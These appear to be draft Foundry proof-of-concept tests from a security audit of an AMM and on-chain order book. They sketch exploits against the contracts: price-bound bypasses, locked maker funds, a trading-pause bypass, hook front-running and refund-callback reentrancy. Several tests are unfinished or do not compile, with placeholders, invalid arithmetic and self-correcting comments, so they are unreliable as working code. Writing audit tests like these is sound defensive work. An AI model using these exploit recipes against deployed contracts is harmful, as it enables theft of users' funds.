function test_validateHandlerOrder_minPriceBypass_viaRounding() public {
    // Setup: tokenA < tokenB (canonical ordering)
    // _pricingBounds[tokenA][tokenB].minSqrtPriceX96 = REALISTIC_MIN
    uint160 realisticMin = 7_922_816_251_426_434;  // ~1e-6 * Q96, realistic floor
    registry.updatePricingBounds(
        tokenA,
        toArray(tokenB),
        toArray(realisticMin),
        toArray(uint160(type(uint160).max))
    );
    // Set TOKEN_SETTINGS_HANDLER_ORDER_VALIDATE_FLAG for tokenA with hook=ammStandardHook
    TokenSettings memory s;
    s.tokenHook = address(ammStandardHook);
    s.packedSettings = TOKEN_SETTINGS_HANDLER_ORDER_VALIDATE_FLAG;
    amm.setTokenSettings(tokenA, s);

    // Attack: place CLOB order at price WAY below minimum with tiny orderAmount
    uint160 belowMin = realisticMin / 100;  // 100x below minimum
    uint256 tinyAmount = 1 wei;
    // calculateFixedInput(1, belowMin) = 1 (rounds up)
    // computeRatioX96(1, 1) = Q96 >> realisticMin -> no revert
    vm.prank(attacker);
    uint256 nonce = clobHandler.openOrder(
        tokenA, tokenB,
        belowMin,       // stored price: 100x below minSqrtPriceX96
        tinyAmount,
        groupKey,
        belowMin,
        HooksExtraData(new bytes(0), new bytes(0), new bytes(0))
    );
    // Assert: order was placed despite violating minSqrtPriceX96
    // The fill will execute at belowMin price, dumping tokenA at floor-violating rate
    assertGt(nonce, 0);
    // Verify stored order uses the violation price
    (,, uint160 storedPrice,) = clobHandler.getOrder(orderBookKey, nonce);
    assertEq(storedPrice, belowMin);
}

function test_directSwap_maxPriceBound_bypassViaOutputFee() public {
    // Token T has maxSqrtPriceX96 = M and tokenFeeBuyBPS = 1000 (10% output fee)
    // Direct swap at price P = 1.1 * M (10% above max)
    // After 10% output fee: checked_price = 1.1*M * sqrt(0.9) = 1.044*M
    // Wait - fee is on output amount, not on price sqrt:
    // checked = sqrt(amountOut*(1-0.1) / amountIn) = sqrt(P^2*(1-0.1)) = P*sqrt(0.9) = 1.045*M > M? Hmm.
    // For bypass: need P*sqrt(1-F) < M, i.e., P < M / sqrt(1-F)
    // With F=0.5 (50% fee, 5000 BPS): P < M/sqrt(0.5) = M*1.414
    // At P = 1.4*M, checked = 1.4*M * sqrt(0.5) = 0.99*M < M -> BYPASS!
    uint160 maxPrice = 1_000_000_000 * uint160(1 << 48); // some max
    // Set tokenFeeBuyBPS = 5000 (50%)
    // Execute direct swap at 1.4x maxPrice (true price violates bound)
    uint256 amountIn = 1e18;
    uint256 trueAmountOut = amountIn * (1.4 * maxPrice)^2 / Q96^2; // simplified
    uint256 afterFeeOut = trueAmountOut / 2; // 50% fee
    // beforeSwap stores amountIn
    // afterSwap gets afterFeeOut -> computed price < maxPrice -> passes!
    // Assert: swap at 1.4x max completes when should have reverted
    vm.prank(attacker);
    amm.swap(directSwapOrder, "");
    assertGt(IERC20(T).balanceOf(attacker), 0);
}

function test_sentinelBucketCorruption_maxSqrtRatioOrder() public {
    uint160 MAX_PRICE = type(uint160).max; // = MAX_SQRT_RATIO
    // Maker A places 1000e18 tokens at MAX price (allowed, not > MAX)
    vm.startPrank(makerA);
    clobHandler.depositToken(tokenIn, 1000e18);
    uint256 nonceA = clobHandler.openOrder(
        tokenIn, tokenOut, MAX_PRICE, 1000e18, groupKey, MAX_PRICE, emptyHookData
    );
    vm.stopPrank();

    // Maker B places cheap order that can actually be filled
    vm.startPrank(makerB);
    clobHandler.depositToken(tokenIn, 100e18);
    clobHandler.openOrder(tokenIn, tokenOut, normalPrice, 100e18, groupKey, normalPrice, emptyHookData);
    vm.stopPrank();

    // AMM fills makerB's order entirely
    // traverseCLOB exhausts normal-price bucket, advances to sentinel (MAX_PRICE)
    // Line 238: ptrOrderBucket.inputAmountRemaining = 0 written to MAX_PRICE bucket!
    vm.prank(address(amm));
    clobHandler.ammHandleTransfer(
        executor, swapOrderForCLOB, 100e18, normalFillOutput,
        exchangeFee, feeOnTop, fillParams
    );

    // Assert: makerA's order at MAX_PRICE is now corrupted
    // inputAmountRemaining for MAX_PRICE bucket = 0 (should be 1000e18)
    (uint256 corrupted,,) = getOrderBucketInfo(tokenIn, tokenOut, groupKey, MAX_PRICE);
    assertEq(corrupted, 0);  // corrupted! makerA's 1000e18 is locked forever

    // MakerA cannot close (closeOrder would read inputAmountRemaining=0 for current order)
    vm.expectRevert();
    vm.prank(makerA);
    clobHandler.closeOrder(tokenIn, tokenOut, MAX_PRICE, nonceA, groupKey);
}

function test_pauseBypass_initializedFlagNotEnforced() public {
    // Step 1: Normal operation - token cached with initialized=true, tradingIsPaused=false
    amm.swap(/* tokenT swap */);  // warms the cache

    // Step 2: Registry sends pause update WITH initialized=false (bug trigger)
    HookTokenSettings memory pauseSettings = HookTokenSettings({
        initialized: false,  // <-- registry forgot to set true, or uses default struct
        tradingIsPaused: true,
        blockDirectSwaps: false,
        checkDisabledPools: false,
        tokenFeeBuyBPS: 0, tokenFeeSellBPS: 0,
        pairedFeeBuyBPS: 0, pairedFeeSellBPS: 0,
        minFeeAmount: 0, maxFeeAmount: 0,
        poolTypeWhitelistId: 0,
        pairedTokenWhitelistId: 0,
        lpWhitelistId: 0
    });
    vm.prank(address(registry));
    ammStandardHook.registryUpdateTokenSettings(tokenT, pauseSettings);
    // Cache now: initialized=false, tradingIsPaused=true

    // Step 3: Registry still returns OLD settings (tradingIsPaused=false)
    vm.mockCall(
        address(registry),
        abi.encodeWithSelector(ICreatorHookSettingsRegistry.isTokenInitialized.selector, tokenT),
        abi.encode(true)
    );
    vm.mockCall(
        address(registry),
        abi.encodeWithSelector(ICreatorHookSettingsRegistry.getTokenSettings.selector, tokenT),
        abi.encode(HookTokenSettings({ initialized: true, tradingIsPaused: false /* ... */ }))
    );

    // Step 4: Swap proceeds - _getOrFetchTokenSettings re-fetches stale registry data
    // Expected: revert(AMMStandardHook__TradingPaused)
    // Actual: swap succeeds (uses stale registry data)
    vm.prank(attacker);
    amm.swap(/* tokenT swap */);  // should revert but doesn't
    assertGt(receivedAmount, 0);
}

function test_validateExecutor_frontRun_viaAMM() public {
    // Setup: CLOB order book with MaliciousHook as validator
    // MaliciousHook.validateExecutor() calls amm.swap() to front-run
    MaliciousExecutorHook malHook = new MaliciousExecutorHook(address(amm));
    bytes32 groupKey = clobHandler.generateGroupKey(address(malHook), 1, 0);

    // Maker opens large order
    vm.prank(maker);
    clobHandler.depositToken(tokenIn, 10000e18);
    clobHandler.openOrder(tokenIn, tokenOut, fillPrice, 10000e18, groupKey, fillPrice, emptyHookData);

    // Normal executor tries to fill via AMM
    // AMM calls ammHandleTransfer -> validateExecutor fires
    // malHook sees: amountIn=10000e18, amountOut=X at fillPrice
    // malHook calls amm.swap() for a competing trade BEFORE fillOrder runs
    // This competes with the same pool, front-running the fill
    uint256 malHookBalanceBefore = IERC20(tokenOut).balanceOf(address(malHook));

    vm.prank(executor);
    amm.swap(/* CLOB fill swap */, fillParams);

    uint256 malHookProfit = IERC20(tokenOut).balanceOf(address(malHook)) - malHookBalanceBefore;
    // If AMM allows nested calls from the hook, malHook extracted value front-running the fill
    assertGt(malHookProfit, 0);
}

function test_sentinel_nextOrder_stalePointer() public {
    // Open order A (first in bucket) -> nextOrder[0]=A, previousOrder[0]=A
    vm.prank(maker);
    uint256 nonceA = openSingleOrder(100e18);

    // Fill A completely -> traverseCLOB with nextOrderId=0
    // Sets: nextOrder[A]=0, previousOrder[0]=0
    // Note: nextOrder[0] still = A from openOrder! (stale)
    fillAllOrders(100e18);

    // Open order B -> lastOrderId = previousOrder[0] = 0
    // nextOrder[0] = B (overwrites stale A pointer)
    // previousOrder[0] = B, previousOrder[B] = 0
    uint256 nonceB = openSingleOrder(200e18);

    // Open order C -> lastOrderId = previousOrder[0] = B
    // nextOrder[B] = C, previousOrder[0] = C, previousOrder[C] = B
    uint256 nonceC = openSingleOrder(300e18);

    // Fill B and C -> verify queue integrity throughout
    fillAllOrders(200e18);  // fills B
    fillAllOrders(300e18);  // fills C

    // Assert: queue is clean, no stale pointer corruption
    (uint256 inputRemaining,,) = getOrderBucketInfo(...);
    assertEq(inputRemaining, 0);
    // Open D after full clear, verify clean state
    uint256 nonceD = openSingleOrder(400e18);
    assertEq(getOrderBookCurrentPrice(), normalPrice);
}

function test_afterSwapRefund_noReentrancyGuard_wrappedNativeCallback() public {
    // Deploy: executor is a contract with receive() that calls clob.withdrawToken
    MaliciousExecutor exec = new MaliciousExecutor(address(clobHandler));

    // Setup: exec has a makerTokenBalance[WNATIVE] credit from prior fill
    // (simulating a world where exec was also a maker whose order just got filled)
    vm.prank(address(exec));
    clobHandler.depositToken(WNATIVE, 500e18);
    vm.prank(address(exec));
    uint256 nonce = clobHandler.openOrder(tokenIn, WNATIVE, somePrice, 500e18, groupKey, somePrice, emptyHookData);
    // ... trigger fill so exec earns makerTokenBalance[WNATIVE][exec] = stepOutput

    // Now exec acts as swap executor that has fillOutputRemaining > 0
    // AMM calls afterSwapRefund(exec, WNATIVE, refundAmt)
    // exec.receive() is triggered by withdrawToAccount
    // exec.receive(): calls clobHandler.withdrawToken(WNATIVE, creditedBalance)
    // nonReentrant guard is NOT_ENTERED at this point -> proceeds!
    uint256 balanceBefore = WNATIVE.balanceOf(address(exec));
    // Simulate the AMM calling afterSwapRefund
    vm.prank(address(amm));
    clobHandler.afterSwapRefund(address(exec), WNATIVE, refundAmount);

    // Assert: exec received refundAmount AND extracted makerTokenBalance in same tx
    uint256 totalReceived = address(exec).balance + WNATIVE.balanceOf(address(exec)) - balanceBefore;
    assertGt(totalReceived, refundAmount, 'exec extracted more than just refund via callback');
}

function test_orderBookKey_ignored_in_validateHandlerOrder() public {
    // Two order books: OB_A (restrictive) and OB_B (permissive), both use ammStandardHook
    bytes32 groupKeyA = clobHandler.generateGroupKey(address(ammStandardHook), 100, 18); // large minimum
    bytes32 groupKeyB = clobHandler.generateGroupKey(address(ammStandardHook), 1, 0);   // tiny minimum

    bytes32 orderBookKeyA = clobHandler.generateOrderBookKey(tokenIn, tokenOut, groupKeyA);
    bytes32 orderBookKeyB = clobHandler.generateOrderBookKey(tokenIn, tokenOut, groupKeyB);

    // Configure pricing bounds ONLY for orderBookKeyA (conceptually)
    // But hook has NO way to enforce per-orderBook bounds
    // because validateHandlerOrder receives orderBookKey in handlerOrderParams but ignores it

    // Verify: handlerOrderParams containing orderBookKeyA is passed but ignored
    vm.prank(maker);
    // This call targets orderBookKeyB (groupKeyB) but passes hookData that would
    // include orderBookKeyA context - hook doesn't distinguish
    uint256 nonce = clobHandler.openOrder(
        tokenIn, tokenOut, anyValidPrice, validAmount,
        groupKeyB, anyValidPrice,
        HooksExtraData(
            abi.encode("tokenIn hook data for OB_A"),
            new bytes(0),
            new bytes(0)
        )
    );
    // Order placed in OB_B despite hookData containing OB_A context
    // Hook validated against global tokenIn/tokenOut bounds, not per-book bounds
    assertGt(nonce, 0, 'order placed with mismatched orderBookKey context');

    // A hypothetical order-book-specific bound enforcement would have rejected this
    // Demonstrates the orderBookKey routing gap
}

function test_pricingBounds_token0_perspective_mismatch() public {
    // TokenA (low addr = token0), TokenB (high addr = token1)
    // Creator of TokenA wants: 'price of my token (TokenA) >= 0.01 ETH'
    // In canonical terms: canonical_price = sqrt(TokenB/TokenA), so if TokenA=0.01ETH,
    // then TokenA/TokenB = 100, so TokenB/TokenA = 0.01 -> sqrt(0.01)*Q96 = minPrice
    // Creator sets _pricingBounds[TokenA][TokenB].minSqrtPriceX96 = sqrtRatio(0.01)

    // Direct swap: sell TokenB (tokenIn=TokenB) to buy TokenA (tokenOut=TokenA)
    // afterSwap hook for TokenA (hookForInputToken=false, tokenOut=TokenA=token0)
    // bounds = _pricingBounds[TokenA][TokenB]
    // zeroForOne = TokenB < TokenA ? FALSE (TokenB > TokenA)
    // !zeroForOne -> amount0=amountOut(TokenA), amount1=stored(amountIn=TokenB)
    // price = sqrt(amountIn/amountOut) = sqrt(TokenB/TokenA)
    // This IS the canonical price, correctly checked against minSqrtPriceX96.
    // So actually correct here. Let's check the OPPOSITE:
    // Direct swap: sell TokenA (tokenIn=TokenA) to buy TokenB (tokenOut=TokenB)
    // afterSwap hook for TokenA (hookForInputToken=true, token=TokenA=token0)
    // zeroForOne = TokenA < TokenB = TRUE
    // inputSwap==zeroForOne -> TRUE: amount0=stored(amountIn=TokenA), amount1=amountOut(TokenB)
    // price = sqrt(amountOut/amountIn) = sqrt(TokenB/TokenA) = canonical
    // ALSO correct.
    // So actually the price check is symmetric. Confirm via Halmos.
    // This is a 'rule out' test to validate the boundary is safe.
    // If the test passes, hypothesis is invalidated (good).
    assertEq(priceFromAfterSwap_selling_tokenA, canonicalPrice);
    assertEq(priceFromAfterSwap_buying_tokenA, canonicalPrice);
}
